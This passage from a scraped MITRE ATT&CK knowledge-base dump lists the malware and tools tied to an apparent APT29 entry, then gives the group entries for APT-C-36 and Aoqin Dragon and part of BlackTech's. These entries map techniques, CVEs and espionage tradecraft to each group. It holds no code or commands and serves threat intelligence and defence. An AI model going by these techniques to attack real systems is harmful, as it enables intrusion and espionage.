Strike [9][13][18][19][17][39][15][48] Abuse Elevation Control Mechanism: Sudo and Sudo Caching, Abuse Elevation Control Mechanism: Bypass User Account Control, Access Token Manipulation: Parent PID Spoofing, Access Token Manipulation: Token Impersonation/Theft, Access Token Manipulation: Make and Impersonate Token, Account Discovery: Domain Account, Application Layer Protocol: DNS, Application Layer Protocol: Web Protocols, Application Layer Protocol: File Transfer Protocols, BITS Jobs, Browser Session Hijacking, Command and Scripting Interpreter: JavaScript, Command and Scripting Interpreter: Visual Basic, Command and Scripting Interpreter: PowerShell, Command and Scripting Interpreter: Python, Command and Scripting Interpreter: Windows Command Shell, Create or Modify System Process: Windows Service, Data Encoding: Standard Encoding, Data from Local System, Data Obfuscation: Protocol or Service Impersonation, Data Transfer Size Limits, Deobfuscate/Decode Files or Information, Encrypted Channel: Asymmetric Cryptography, Encrypted Channel: Symmetric Cryptography, Exploitation for Client Execution, Exploitation for Privilege Escalation, File and Directory Discovery, Hide Artifacts: Process Argument Spoofing, Impair Defenses: Disable or Modify Tools, Indicator Removal: Timestomp, Ingress Tool Transfer, Input Capture: Keylogging, Modify Registry, Native API, Network Service Discovery, Network Share Discovery, Non-Application Layer Protocol, Obfuscated Files or Information: Indicator Removal from Tools, Obfuscated Files or Information, Office Application Startup: Office Template Macros, OS Credential Dumping: LSASS Memory, OS Credential Dumping: Security Account Manager, Permission Groups Discovery: Domain Groups, Permission Groups Discovery: Local Groups, Process Discovery, Process Injection: Dynamic-link Library Injection, Process Injection: Process Hollowing, Process Injection, Protocol Tunneling, Proxy: Domain Fronting, Proxy: Internal Proxy, Query Registry, Reflective Code Loading, Remote Services: Remote Desktop Protocol, Remote Services: SSH, Remote Services: Windows Remote Management, Remote Services: SMB/Windows Admin Shares, Remote Services: Distributed Component Object Model, Remote System Discovery, Scheduled Transfer, Screen Capture, Software Discovery, Subvert Trust Controls: Code Signing, System Binary Proxy Execution: Rundll32, System Network Configuration Discovery, System Network Connections Discovery, System Service Discovery, System Services: Service Execution, Use Alternate Authentication Material: Pass the Hash, Valid Accounts: Domain Accounts, Valid Accounts: Local Accounts, Windows Management Instrumentation S0050 CosmicDuke [3][16] Application Layer Protocol: Web Protocols, Automated Exfiltration, Clipboard Data, Create or Modify System Process: Windows Service, Credentials from Password Stores, Credentials from Password Stores: Credentials from Web Browsers, Data from Local System, Data from Network Shared Drive, Data from Removable Media, Email Collection: Local Email Collection, Encrypted Channel: Symmetric Cryptography, Exfiltration Over Alternative Protocol: Exfiltration Over Unencrypted Non-C2 Protocol, Exploitation for Privilege Escalation, File and Directory Discovery, Input Capture: Keylogging, OS Credential Dumping: LSA Secrets, OS Credential Dumping: Security Account Manager, Scheduled Task/Job: Scheduled Task, Screen Capture S0046 CozyCar [3][16] Application Layer Protocol: Web Protocols, Boot or Logon Autostart Execution: Registry Run Keys / Startup Folder, Command and Scripting Interpreter: Windows Command Shell, Create or Modify System Process: Windows Service, Masquerading: Rename Legitimate Utilities, Obfuscated Files or Information: Encrypted/Encoded File, OS Credential Dumping: LSASS Memory, OS Credential Dumping: Security Account Manager, Scheduled Task/Job: Scheduled Task, Software Discovery: Security Software Discovery, System Binary Proxy Execution: Rundll32, System Information Discovery, Virtualization/Sandbox Evasion, Web Service: Bidirectional Communication S0634 EnvyScout [19] Command and Scripting Interpreter: JavaScript, Command and Scripting Interpreter: Windows Command Shell, Data from Local System, Deobfuscate/Decode Files or Information, Execution Guardrails, Forced Authentication, Hide Artifacts: Hidden Files and Directories, Masquerading, Obfuscated Files or Information: Encrypted/Encoded File, Obfuscated Files or Information: HTML Smuggling, Phishing: Spearphishing Attachment, System Binary Proxy Execution: Rundll32, System Information Discovery, User Execution: Malicious File S0512 FatDuke [22][16] Application Layer Protocol: Web Protocols, Boot or Logon Autostart Execution: Registry Run Keys / Startup Folder, Command and Scripting Interpreter: PowerShell, Data from Local System, Deobfuscate/Decode Files or Information, Encrypted Channel: Symmetric Cryptography, Fallback Channels, File and Directory Discovery, Indicator Removal: File Deletion, Masquerading, Native API, Obfuscated Files or Information: Software Packing, Obfuscated Files or Information, Obfuscated Files or Information: Junk Code Insertion, Process Discovery, Proxy: Internal Proxy, Query Registry, System Binary Proxy Execution: Rundll32, System Information Discovery, System Network Configuration Discovery, Virtualization/Sandbox Evasion: Time Based Evasion S0661 FoggyWeb [52] Application Layer Protocol: Web Protocols, Archive Collected Data: Archive via Custom Method, Archive Collected Data: Archive via Library, Data from Local System, Deobfuscate/Decode Files or Information, Encrypted Channel: Symmetric Cryptography, Exfiltration Over C2 Channel, File and Directory Discovery, Hijack Execution Flow: DLL, Ingress Tool Transfer, Masquerading, Masquerading: Match Legitimate Resource Name or Location, Native API, Network Sniffing, Obfuscated Files or Information: Compile After Delivery, Obfuscated Files or Information: Encrypted/Encoded File, Process Discovery, Reflective Code Loading, Shared Modules, Unsecured Credentials: Private Keys, Use Alternate Authentication Material S0049 GeminiDuke [3] Account Discovery: Local Account, Application Layer Protocol: Web Protocols, File and Directory Discovery, Process Discovery, System Network Configuration Discovery, System Service Discovery S0597 GoldFinder [10][13][19][15] Application Layer Protocol: Web Protocols, Automated Collection, System Network Configuration Discovery: Internet Connection Discovery S0588 GoldMax [10][13][18][19][15] Application Layer Protocol: Web Protocols, Command and Scripting Interpreter: Windows Command Shell, Data Obfuscation: Junk Data, Deobfuscate/Decode Files or Information, Encrypted Channel: Asymmetric Cryptography, Exfiltration Over C2 Channel, Hide Artifacts: Ignore Process Interrupts, Ingress Tool Transfer, Masquerading: Match Legitimate Resource Name or Location, Masquerading: Masquerade Task or Service, Obfuscated Files or Information: Software Packing, Obfuscated Files or Information: Encrypted/Encoded File, Scheduled Task/Job: Scheduled Task, Scheduled Task/Job: Cron, System Network Configuration Discovery, System Time Discovery, Virtualization/Sandbox Evasion: Time Based Evasion, Virtualization/Sandbox Evasion: System Checks S0037 HAMMERTOSS [3][16] Application Layer Protocol: Web Protocols, Command and Scripting Interpreter: PowerShell, Data Obfuscation: Steganography, Encrypted Channel: Symmetric Cryptography, Exfiltration Over Web Service: Exfiltration to Cloud Storage, Hide Artifacts: Hidden Window, Web Service: One-Way Communication S0357 Impacket [27] Adversary-in-the-Middle: LLMNR/NBT-NS Poisoning and SMB Relay, Lateral Tool Transfer, Network Sniffing, OS Credential Dumping: NTDS, OS Credential Dumping: LSASS Memory, OS Credential Dumping: Security Account Manager, OS Credential Dumping: LSA Secrets, Steal or Forge Kerberos Tickets: Kerberoasting, Steal or Forge Kerberos Tickets: Ccache Files, System Services: Service Execution, Windows Management Instrumentation S0100 ipconfig [53] System Network Configuration Discovery S0513 LiteDuke [22][16] Application Layer Protocol: Web Protocols, Boot or Logon Autostart Execution: Registry Run Keys / Startup Folder, Deobfuscate/Decode Files or Information, Indicator Removal: File Deletion, Ingress Tool Transfer, Obfuscated Files or Information: Steganography, Obfuscated Files or Information: Software Packing, Query Registry, Software Discovery: Security Software Discovery, System Information Discovery, System Network Configuration Discovery, System Owner/User Discovery, Virtualization/Sandbox Evasion: Time Based Evasion S0175 meek [30] Proxy: Domain Fronting S0002 Mimikatz [3][44][24] Access Token Manipulation: SID-History Injection, Account Manipulation, Boot or Logon Autostart Execution: Security Support Provider, Credentials from Password Stores, Credentials from Password Stores: Credentials from Web Browsers, Credentials from Password Stores: Windows Credential Manager, OS Credential Dumping: DCSync, OS Credential Dumping: Security Account Manager, OS Credential Dumping: LSASS Memory, OS Credential Dumping: LSA Secrets, Rogue Domain Controller, Steal or Forge Authentication Certificates, Steal or Forge Kerberos Tickets: Golden Ticket, Steal or Forge Kerberos Tickets: Silver Ticket, Unsecured Credentials: Private Keys, Use Alternate Authentication Material: Pass the Hash, Use Alternate Authentication Material: Pass the Ticket S0051 MiniDuke [3][22][16] Application Layer Protocol: Web Protocols, Dynamic Resolution: Domain Generation Algorithms, Fallback Channels, File and Directory Discovery, Ingress Tool Transfer, Obfuscated Files or Information, Proxy: Internal Proxy, System Information Discovery, Web Service: Dead Drop Resolver S0637 NativeZone [17] Deobfuscate/Decode Files or Information, Execution Guardrails, Masquerading, System Binary Proxy Execution: Rundll32, User Execution: Malicious File, Virtualization/Sandbox Evasion: System Checks S0039 Net [53] Account Discovery: Domain Account, Account Discovery: Local Account, Account Manipulation: Additional Local or Domain Groups, Create Account: Local Account, Create Account: Domain Account, Indicator Removal: Network Share Connection Removal, Network Share Discovery, Password Policy Discovery, Permission Groups Discovery: Domain Groups, Permission Groups Discovery: Local Groups, Remote Services: SMB/Windows Admin Shares, Remote System Discovery, System Network Connections Discovery, System Service Discovery, System Services: Service Execution, System Time Discovery S0052 OnionDuke [3][22][16] Application Layer Protocol: Web Protocols, Deobfuscate/Decode Files or Information, Endpoint Denial of Service, OS Credential Dumping, Web Service: One-Way Communication S0048 PinchDuke [3] Application Layer Protocol: Web Protocols, Credentials from Password Stores, Credentials from Password Stores: Credentials from Web Browsers, Data from Local System, File and Directory Discovery, OS Credential Dumping, System Information Discovery S0518 PolyglotDuke [22][16] Application Layer Protocol: Web Protocols, Deobfuscate/Decode Files or Information, Ingress Tool Transfer, Modify Registry, Native API, Obfuscated Files or Information, Obfuscated Files or Information: Fileless Storage, Obfuscated Files or Information: Steganography, System Binary Proxy Execution: Rundll32, Web Service: Dead Drop Resolver S0150 POSHSPY [54] Command and Scripting Interpreter: PowerShell, Data Transfer Size Limits, Dynamic Resolution: Domain Generation Algorithms, Encrypted Channel: Asymmetric Cryptography, Event Triggered Execution: Windows Management Instrumentation Event Subscription, Indicator Removal: Timestomp, Ingress Tool Transfer, Obfuscated Files or Information S0139 PowerDuke [55] Application Window Discovery, Boot or Logon Autostart Execution: Registry Run Keys / Startup Folder, Command and Scripting Interpreter: Windows Command Shell, Data Destruction, File and Directory Discovery, Hide Artifacts: NTFS File Attributes, Indicator Removal: File Deletion, Ingress Tool Transfer, Obfuscated Files or Information: Steganography, Process Discovery, System Binary Proxy Execution: Rundll32, System Information Discovery, System Network Configuration Discovery, System Owner/User Discovery, System Time Discovery S0029 PsExec [3][22] Create Account: Domain Account, Create or Modify System Process: Windows Service, Lateral Tool Transfer, Remote Services: SMB/Windows Admin Shares, System Services: Service Execution S1084 QUIETEXIT [27] Application Layer Protocol, Fallback Channels, Masquerading: Match Legitimate Resource Name or Location, Non-Application Layer Protocol, Proxy: External Proxy S0565 Raindrop [43][19][15] Deobfuscate/Decode Files or Information, Masquerading, Masquerading: Match Legitimate Resource Name or Location, Obfuscated Files or Information: Encrypted/Encoded File, Obfuscated Files or Information: Software Packing, Obfuscated Files or Information: Steganography, Virtualization/Sandbox Evasion: Time Based Evasion S0511 RegDuke [22][16] Command and Scripting Interpreter: PowerShell, Deobfuscate/Decode Files or Information, Event Triggered Execution: Windows Management Instrumentation Event Subscription, Ingress Tool Transfer, Modify Registry, Obfuscated Files or Information: Steganography, Obfuscated Files or Information: Fileless Storage, Obfuscated Files or Information, Web Service: Bidirectional Communication S1187 reGeorg [27] Application Layer Protocol: Web Protocols, Command and Scripting Interpreter: Python, Ingress Tool Transfer, Non-Application Layer Protocol, Protocol Tunneling, Proxy, Remote Services: Remote Desktop Protocol, Remote Services: SSH, Remote Services: SMB/Windows Admin Shares, Server Software Component: Web Shell S0684 ROADTools [31] Account Discovery: Cloud Account, Automated Collection, Cloud Service Discovery, Permission Groups Discovery: Cloud Groups, Remote System Discovery, Valid Accounts: Cloud Accounts S0195 SDelete [30] Data Destruction, Indicator Removal: File Deletion S0053 SeaDuke [3][16][38] Application Layer Protocol: Web Protocols, Archive Collected Data: Archive via Library, Boot or Logon Autostart Execution: Registry Run Keys / Startup Folder, Boot or Logon Autostart Execution: Shortcut Modification, Command and Scripting Interpreter: Windows Command Shell, Command and Scripting Interpreter: PowerShell, Data Encoding: Standard Encoding, Email Collection: Remote Email Collection, Encrypted Channel: Symmetric Cryptography, Event Triggered Execution: Windows Management Instrumentation Event Subscription, Indicator Removal: File Deletion, Ingress Tool Transfer, Obfuscated Files or Information: Software Packing, Use Alternate Authentication Material: Pass the Ticket, Valid Accounts S0589 Sibot [10][13][19][15] Application Layer Protocol: Web Protocols, Command and Scripting Interpreter: Visual Basic, Deobfuscate/Decode Files or Information, Indicator Removal: File Deletion, Indicator Removal, Ingress Tool Transfer, Masquerading: Match Legitimate Resource Name or Location, Modify Registry, Obfuscated Files or Information: Command Obfuscation, Obfuscated Files or Information: Fileless Storage, Query Registry, Scheduled Task/Job: Scheduled Task, System Binary Proxy Execution: Mshta, System Binary Proxy Execution: Rundll32, System Network Configuration Discovery, System Network Connections Discovery, Web Service, Windows Management Instrumentation S0633 Sliver [13][16] Abuse Elevation Control Mechanism: Bypass User Account Control, Access Token Manipulation, Application Layer Protocol: DNS, Application Layer Protocol: Web Protocols, Application Layer Protocol, Command and Scripting Interpreter: PowerShell, Data Encoding: Standard Encoding, Data Obfuscation: Steganography, Encrypted Channel: Asymmetric Cryptography, Encrypted Channel: Symmetric Cryptography, Exfiltration Over C2 Channel, File and Directory Discovery, Ingress Tool Transfer, Obfuscated Files or Information, Obfuscated Files or Information: Compile After Delivery, Obfuscated Files or Information: Encrypted/Encoded File, OS Credential Dumping: LSASS Memory, Process Injection, Proxy: Internal Proxy, Screen Capture, Steal or Forge Kerberos Tickets: Golden Ticket, System Network Configuration Discovery, System Network Connections Discovery S0516 SoreFang [23][53] Account Discovery: Domain Account, Account Discovery: Local Account, Application Layer Protocol: Web Protocols, Deobfuscate/Decode Files or Information, Exploit Public-Facing Application, File and Directory Discovery, Ingress Tool Transfer, Obfuscated Files or Information, Permission Groups Discovery: Domain Groups, Process Discovery, Scheduled Task/Job: Scheduled Task, System Information Discovery, System Network Configuration Discovery S0559 SUNBURST [9][18][15] Application Layer Protocol: DNS, Application Layer Protocol: Web Protocols, Command and Scripting Interpreter: Visual Basic, Data Encoding: Standard Encoding, Data from Local System, Data Obfuscation: Protocol or Service Impersonation, Data Obfuscation: Junk Data, Data Obfuscation: Steganography, Dynamic Resolution, Encrypted Channel: Symmetric Cryptography, Event Triggered Execution: Image File Execution Options Injection, File and Directory Discovery, Impair Defenses: Disable or Modify Tools, Indicator Removal: Clear Persistence, Indicator Removal: File Deletion, Indicator Removal: Clear Network Connection History and Configurations, Indicator Removal, Ingress Tool Transfer, Masquerading: Match Legitimate Resource Name or Location, Modify Registry, Obfuscated Files or Information, Obfuscated Files or Information: Compression, Obfuscated Files or Information: Indicator Removal from Tools, Process Discovery, Query Registry, Software Discovery: Security Software Discovery, Subvert Trust Controls: Code Signing, System Binary Proxy Execution: Rundll32, System Information Discovery, System Network Configuration Discovery, System Owner/User Discovery, System Service Discovery, System Time Discovery, Virtualization/Sandbox Evasion: Time Based Evasion, Virtualization/Sandbox Evasion: System Checks, Windows Management Instrumentation S0562 SUNSPOT [11][19] Access Token Manipulation, Data Manipulation: Stored Data Manipulation, Deobfuscate/Decode Files or Information, Execution Guardrails, Execution Guardrails: Mutual Exclusion, File and Directory Discovery, Indicator Removal: File Deletion, Masquerading: Match Legitimate Resource Name or Location, Native API, Obfuscated Files or Information, Process Discovery, Supply Chain Compromise: Compromise Software Supply Chain S0096 Systeminfo [53] System Information Discovery S0057 Tasklist [53] Process Discovery, Software Discovery: Security Software Discovery, System Service Discovery S0560 TEARDROP [9][18][19][15] Create or Modify System Process: Windows Service, Deobfuscate/Decode Files or Information, Masquerading: Match Legitimate Resource Name or Location, Modify Registry, Obfuscated Files or Information, Query Registry S0183 Tor [30] Encrypted Channel: Asymmetric Cryptography, Proxy: Multi-hop Proxy S0682 TrailBlazer [24] Application Layer Protocol: Web Protocols, Data Obfuscation: Junk Data, Data Obfuscation, Event Triggered Execution: Windows Management Instrumentation Event Subscription, Masquerading S0636 VaporRage [19] Application Layer Protocol: Web Protocols, Deobfuscate/Decode Files or Information, Execution Guardrails, Ingress Tool Transfer S0515 WellMail [56][23][13] Archive Collected Data, Data from Local System, Deobfuscate/Decode Files or Information, Encrypted Channel: Asymmetric Cryptography, Ingress Tool Transfer, Non-Application Layer Protocol, Non-Standard Port, System Network Configuration Discovery, System Owner/User Discovery S0514 WellMess [25][26][57][23][13] Application Layer Protocol: DNS, Application Layer Protocol: Web Protocols, Command and Scripting Interpreter: PowerShell, Command and Scripting Interpreter: Windows Command Shell, Data Encoding: Standard Encoding, Data from Local System, Data Obfuscation: Junk Data, Deobfuscate/Decode Files or Information, Encrypted Channel: Asymmetric Cryptography, Encrypted Channel: Symmetric Cryptography, Ingress Tool Transfer, Permission Groups Discovery: Domain Groups, System Information Discovery, System Network Configuration Discovery, System Owner/User Discovery References White House. (2021, April 15). Imposing Costs for Harmful Foreign Activities by the Russian Government. Retrieved April 16, 2021. UK Gov. (2021, April 15). UK and US expose global campaign of malign activity by Russian intelligence services . Retrieved April 16, 2021. F-Secure Labs. (2015, September 17). The Dukes: 7 years of Russian cyberespionage. Retrieved December 10, 2015. Department of Homeland Security and Federal Bureau of Investigation. (2016, December 29). GRIZZLY STEPPE \u2013 Russian Malicious Cyber Activity. Retrieved January 11, 2017. Alperovitch, D.. (2016, June 15). Bears in the Midst: Intrusion into the Democratic National Committee. Retrieved August 3, 2016. UK Gov. (2021, April 15). UK exposes Russian involvement in SolarWinds cyber compromise . Retrieved April 16, 2021. NSA, FBI, DHS. (2021, April 15). Russian SVR Targets U.S. and Allied Networks. Retrieved April 16, 2021. UK NCSC. (2021, April 15). UK and US call out Russia for SolarWinds compromise. Retrieved April 16, 2021. FireEye. (2020, December 13). Highly Evasive Attacker Leverages SolarWinds Supply Chain to Compromise Multiple Global Victims With SUNBURST Backdoor. Retrieved January 4, 2021. Nafisi, R., Lelli, A. (2021, March 4). GoldMax, GoldFinder, and Sibot: Analyzing NOBELIUM\u2019s layered persistence. Retrieved March 8, 2021. CrowdStrike Intelligence Team. (2021, January 11). SUNSPOT: An Implant in the Build Process. Retrieved January 11, 2021. Cash, D. et al. (2020, December 14). Dark Halo Leverages SolarWinds Compromise to Breach Organizations. Retrieved December 29, 2020. NCSC, CISA, FBI, NSA. (2021, May 7). Further TTPs associated with SVR cyber actors. Retrieved July 29, 2021. Unit 42. (2020, December 23). SolarStorm Supply Chain Attack Timeline. Retrieved March 24, 2023. Secureworks CTU. (n.d.). IRON RITUAL. Retrieved February 24, 2022. Secureworks CTU. (n.d.). IRON HEMLOCK. Retrieved February 22, 2022. Guerrero-Saade, J. (2021, June 1). NobleBaron | New Poisoned Installers Could Be Used In Supply Chain Attacks. Retrieved August 4, 2021. Microsoft Threat Intelligence Center (MSTIC). (2021, May 27). New sophisticated email-based attack from NOBELIUM. Retrieved May 28, 2021. MSTIC. (2021, May 28). Breaking down NOBELIUM\u2019s latest early-stage toolset. Retrieved August 4, 2021. MSRC. (2021, June 25). New Nobelium activity. Retrieved August 4, 2021. Microsoft Defender Research Team. (2018, December 3). Analysis of cyberattack on U.S. think tanks, non-profits, public sector by unidentified attackers. Retrieved April 15, 2019. Faou, M., Tartare, M., Dupuy, T. (2019, October). OPERATION GHOST. Retrieved September 23, 2020. National Cyber Security Centre. (2020, July 16). Advisory: APT29 targets COVID-19 vaccine development. Retrieved September 29, 2020. CrowdStrike. (2022, January 27). Early Bird Catches the Wormhole: Observations from the StellarParticle Campaign. Retrieved February 7, 2022. PWC. (2020, July 16). How WellMess malware has been used to target COVID-19 vaccines. Retrieved September 24, 2020. PWC. (2020, August 17). WellMess malware: analysis of its Command and Control (C2) server. Retrieved September 29, 2020. Mandiant. (2022, May 2). UNC3524: Eye Spy on Your Email. Retrieved August 17, 2023. Microsoft . (2023, July 12). How Microsoft names threat actors. Retrieved November 17, 2023. Mandiant. (2020, April 27). Assembling the Russian Nesting Doll: UNC2452 Merged into APT29. Retrieved March 26, 2023. Dunwoody, M. and Carr, N.. (2016, September 27). No Easy Breach DerbyCon 2016. Retrieved September 12, 2024. Microsoft Threat Intelligence Center. (2021, October 25). NOBELIUM targeting delegated administrative privileges to facilitate broader attacks. Retrieved March 25, 2022. MSRC. (2020, December 13). Customer Guidance on Recent Nation-State Cyber Attacks. Retrieved December 30, 2020. Douglas Bienstock. (2022, August 18). You Can\u2019t Audit Me: APT29 Continues Targeting Microsoft 365. Retrieved February 23, 2023. UK National Cyber Security Center et al. (2024, February). SVR cyber actors adapt tactics for initial cloud access. Retrieved March 1, 2024. Smith, L., Leathery, J., Read, B. (2021, March 4). New SUNSHUTTLE Second-Stage Backdoor Uncovered Targeting U.S.-Based Entity; Possible Connection to UNC2452. Retrieved March 12, 2021. FireEye Labs. (2015, July). HAMMERTOSS: Stealthy Tactics Define a Russian Cyber Threat Group. Retrieved November 17, 2024. MSTIC, CDOC, 365 Defender Research Team. (2021, January 20). Deep dive into the Solorigate second-stage activation: From SUNBURST to TEARDROP and Raindrop . Retrieved January 22, 2021. Symantec Security Response. (2015, July 13). \u201cForkmeiamfamous\u201d: Seaduke, latest weapon in the Duke armory. Retrieved July 22, 2015. ESET. (2022, February). THREAT REPORT T3 2021. Retrieved February 10, 2022. MSTIC. (2020, December 18). Analyzing Solorigate, the compromised DLL file that started a sophisticated cyberattack, and how Microsoft Defender helps protect customers . Retrieved January 5, 2021. ANSSI. (2021, December 6). PHISHING CAMPAIGNS BY THE NOBELIUM INTRUSION SET. Retrieved April 13, 2022. MSRC Team. (2021, February 18). Microsoft Internal Solorigate Investigation \u2013 Final Update. Retrieved May 14, 2021. Symantec Threat Hunter Team. (2021, January 18). Raindrop: New Malware Discovered in SolarWinds Investigation. Retrieved January 19, 2021. Microsoft 365 Defender Team. (2020, December 28). Using Microsoft 365 Defender to protect against Solorigate. Retrieved January 7, 2021. Dunwoody, M. (2017, March 27). APT29 Domain Fronting With TOR. Retrieved March 27, 2017. Microsoft Threat Intelligence Center, Microsoft Detection and Response Team, Microsoft 365 Defender Research Team . (2022, August 24). MagicWeb: NOBELIUM\u2019s post-compromise trick to authenticate as anyone. Retrieved September 28, 2022. Luke Jenkins, Sarah Hawley, Parnian Najafi, Doug Bienstock. (2021, December 6). Suspected Russian Activity Targeting Government and Business Entities Around the Globe. Retrieved April 15, 2022. Secureworks CTU. (2021, May 28). USAID-Themed Phishing Campaign Leverages U.S. Elections Lure. Retrieved February 24, 2022. Mandiant. (2022, August). Remediation and Hardening Strategies for Microsoft 365 to Defend Against APT29. Retrieved February 21, 2023. Wolfram, J. et al. (2022, April 28). Trello From the Other Side: Tracking APT29 Phishing Campaigns. Retrieved August 3, 2022. Sudhakar Ramakrishna . (2021, January 11). New Findings From Our Investigation of SUNBURST. Retrieved January 13, 2021. Ramin Nafisi. (2021, September 27). FoggyWeb: Targeted NOBELIUM malware leads to persistent backdoor. Retrieved October 4, 2021. CISA. (2020, July 16). MAR-10296782-1.v1 \u2013 SOREFANG. Retrieved September 29, 2020. Dunwoody, M.. (2017, April 3). Dissecting One of APT29\u2019s Fileless WMI and PowerShell Backdoors (POSHSPY). Retrieved April 5, 2017. Adair, S.. (2016, November 9). PowerDuke: Widespread Post-Election Spear Phishing Campaigns Targeting Think Tanks and NGOs. Retrieved January 11, 2017. CISA. (2020, July 16). MAR-10296782-3.v1 \u2013 WELLMAIL. Retrieved September 29, 2020. CISA. (2020, July 16). MAR-10296782-2.v1 \u2013 WELLMESS. Retrieved September 24, 2020. "
},
{
"id": 158,
"title": "APT-C-36, Blind Eagle, Group G0099",
"path": "/groups/G0099/index.html",
"content": " APT-C-36 APT-C-36 is a suspected South America espionage group that has been active since at least 2018. The group mainly targets Colombian government institutions as well as important corporations in the financial sector, petroleum industry, and professional manufacturing.[1] ID: G0099 \u24d8 Associated Groups: Blind Eagle Contributors: Jose Luis S\u00e1nchez Martinez Version: 1.1 Created: 05 May 2020 Last Modified: 16 April 2025 Version Permalink Live Version Associated Group Descriptions Name Description Blind Eagle [1] Techniques Used Domain ID Name Use Enterprise T1059 .005 Command and Scripting Interpreter: Visual Basic APT-C-36 has embedded a VBScript within a malicious Word document which is executed upon the document opening.[1] Enterprise T1105 Ingress Tool Transfer APT-C-36 has downloaded binary data from a specified domain after the malicious document is opened.[1] Enterprise T1036 .004 Masquerading: Masquerade Task or Service APT-C-36 has disguised its scheduled tasks as those used by Google.[1] Enterprise T1571 Non-Standard Port APT-C-36 has used port 4050 for C2 communications.[1] Enterprise T1027 Obfuscated Files or Information APT-C-36 has used ConfuserEx to obfuscate its variant of Imminent Monitor, compressed payload and RAT packages, and password protected encrypted email attachments to avoid detection.[1] Enterprise T1588 .002 Obtain Capabilities: Tool APT-C-36 obtained and used a modified variant of Imminent Monitor.[1] Enterprise T1566 .001 Phishing: Spearphishing Attachment APT-C-36 has used spearphishing emails with password protected RAR attachment to avoid being detected by the email gateway.[1] Enterprise T1053 .005 Scheduled Task/Job: Scheduled Task APT-C-36 has used a macro function to set scheduled tasks, disguised as those used by Google.[1] Enterprise T1204 .002 User Execution: Malicious File APT-C-36 has prompted victims to accept macros in order to execute the subsequent payload.[1] Software ID Name References Techniques S0434 Imminent Monitor [1] Audio Capture, Command and Scripting Interpreter, Credentials from Password Stores: Credentials from Web Browsers, Deobfuscate/Decode Files or Information, Exfiltration Over C2 Channel, File and Directory Discovery, Hide Artifacts: Hidden Files and Directories, Impair Defenses: Disable or Modify Tools, Indicator Removal: File Deletion, Input Capture: Keylogging, Native API, Obfuscated Files or Information, Process Discovery, Remote Services: Remote Desktop Protocol, Resource Hijacking: Compute Hijacking, Video Capture References QiAnXin Threat Intelligence Center. (2019, February 18). APT-C-36: Continuous Attacks Targeting Colombian Government Institutions and Corporations. Retrieved May 5, 2020. "
},
{
"id": 159,
"title": "Aoqin Dragon, Group G1007",
"path": "/groups/G1007/index.html",
"content": " Aoqin Dragon Aoqin Dragon is a suspected Chinese cyber espionage threat group that has been active since at least 2013. Aoqin Dragon has primarily targeted government, education, and telecommunication organizations in Australia, Cambodia, Hong Kong, Singapore, and Vietnam. Security researchers noted a potential association between Aoqin Dragon and UNC94, based on malware, infrastructure, and targets.[1] ID: G1007 Contributors: Hiroki Nagahama, NEC Corporation; Pooja Natarajan, NEC Corporation India; Manikantan Srinivasan, NEC Corporation India Version: 1.0 Created: 14 July 2022 Last Modified: 16 April 2025 Version Permalink Live Version Techniques Used Domain ID Name Use Enterprise T1587 .001 Develop Capabilities: Malware Aoqin Dragon has used custom malware, including Mongall and Heyoka Backdoor, in their operations.[1] Enterprise T1203 Exploitation for Client Execution Aoqin Dragon has exploited CVE-2012-0158 and CVE-2010-3333 for execution against targeted systems.[1] Enterprise T1083 File and Directory Discovery Aoqin Dragon has run scripts to identify file formats including Microsoft Word.[1] Enterprise T1570 Lateral Tool Transfer Aoqin Dragon has spread malware in target networks by copying modules to folders masquerading as removable devices.[1] Enterprise T1036 Masquerading Aoqin Dragon has used fake icons including antivirus and external drives to disguise malicious payloads.[1] Enterprise T1027 .002 Obfuscated Files or Information: Software Packing Aoqin Dragon has used the Themida packer to obfuscate malicious payloads.[1] Enterprise T1588 .002 Obtain Capabilities: Tool Aoqin Dragon obtained the Heyoka open source exfiltration tool and subsequently modified it for their operations.[1] Enterprise T1091 Replication Through Removable Media Aoqin Dragon has used a dropper that employs a worm infection strategy using a removable device to breach a secure network environment.[1] Enterprise T1204 .002 User Execution: Malicious File Aoqin Dragon has lured victims into opening weaponized documents, fake external drives, and fake antivirus to execute malicious payloads.[1] Software ID Name References Techniques S1027 Heyoka Backdoor [1] Application Layer Protocol: DNS, Boot or Logon Autostart Execution: Registry Run Keys / Startup Folder, Deobfuscate/Decode Files or Information, File and Directory Discovery, Indicator Removal: File Deletion, Masquerading: Masquerade Task or Service, Obfuscated Files or Information: Encrypted/Encoded File, Peripheral Device Discovery, Process Discovery, Process Injection: Dynamic-link Library Injection, Protocol Tunneling, System Binary Proxy Execution: Rundll32, System Information Discovery, System Service Discovery, User Execution: Malicious File S1026 Mongall [1] Application Layer Protocol: Web Protocols, Boot or Logon Autostart Execution: Registry Run Keys / Startup Folder, Data Encoding: Standard Encoding, Data from Local System, Deobfuscate/Decode Files or Information, Encrypted Channel: Symmetric Cryptography, Exfiltration Over C2 Channel, Ingress Tool Transfer, Obfuscated Files or Information: Software Packing, Peripheral Device Discovery, Process Injection: Dynamic-link Library Injection, System Binary Proxy Execution: Rundll32, System Information Discovery, User Execution: Malicious File References Chen, Joey. (2022, June 9). Aoqin Dragon | Newly-Discovered Chinese-linked APT Has Been Quietly Spying On Organizations For 10 Years. Retrieved July 14, 2022. "
},
{
"id": 160,
"title": "BlackTech, Palmerworm, Group G0098",
"path": "/groups/G0098/index.html",
"content": " BlackTech BlackTech is a suspected Chinese cyber espionage group that has primarily targeted organizations in East Asia--particularly Taiwan, Japan, and Hong Kong--and the US since at least 2013. BlackTech has used a combination of custom malware, dual-use tools, and living off the land tactics to compromise media, construction, engineering, electronics, and financial company networks.[1][2][3] ID: G0098 \u24d8 Associated Groups: Palmerworm Contributors: Tatsuya Daitoku, Cyber Defense Institute, Inc.; Hannah Simes, BT Security Version: 2.0 Created: 05 May 2020 Last Modified: 16 April 2025 Version Permalink Live Version Associated Group Descriptions Name Description Palmerworm [2][4] Techniques Used Domain ID Name Use Enterprise T1190 Exploit Public-Facing Application BlackTech has exploited a buffer overflow vulnerability in Microsoft Internet Information Services (IIS) 6.0, CVE-2017-7269, in order to establish a new HTTP or command and control (C2) server.[1] Enterprise T1203 Exploitation for Client Execution BlackTech has exploited multiple vulnerabilities for execution, including Microsoft Office vulnerabilities CVE-2012-0158, CVE-2014-6352, CVE-2017-0199, and Adobe Flash CVE-2015-5119.[1] Enterprise T1574 .001 Hijack Execution Flow: DLL BlackTech has used DLL side loading by giving DLLs hardcoded names and placing them in searched directories.[5] Enterprise T1036 .002 Masquerading: Right-to-Left Override BlackTech has used right-to-left-override to obfuscate the filenames of malicious e-mail attachments.[1] Enterprise T1106 Native 